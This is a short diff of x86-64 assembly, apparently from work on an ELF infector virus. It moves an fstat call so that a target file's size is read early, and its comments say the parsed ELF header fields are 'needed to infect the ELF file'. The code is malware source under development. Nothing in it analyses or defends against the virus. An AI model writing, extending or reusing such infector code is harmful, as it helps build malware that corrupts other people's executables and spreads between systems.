@@ -45,7 +45,8 @@ section .bss
     ph_entry_size resq 1
     ph_num resq 1
     loop_counter resq 1
-    stat resb 144
+    stat_buffer resb 144
+    file_size resq 1
 
 section .text
     global _start
@@ -65,6 +66,16 @@ _start:
     mov rsi, buffer
     mov rdx, buffer_len
     syscall
+
+    ; Get file information
+    mov rax, 5
+    mov rdi, [fd]
+    mov rsi, stat_buffer
+    syscall
+
+    ; Get the file size
+    mov rax, [stat_buffer + 48]  
+    mov [file_size], rax
 
     ; Check if it is a directory
     jmp check_dir
@@ -139,12 +150,6 @@ is_elf:
     jmp retrieve_info
 
 retrieve_info:
-    ; Get file size
-    mov rax, 5      ; fstat
-    mov rdi, [fd]   
-    lea rsi, [stat]
-    syscall
-
     ; Retrieve information needed to infect the ELF file
     mov rsi, buffer
     add rsi, 24
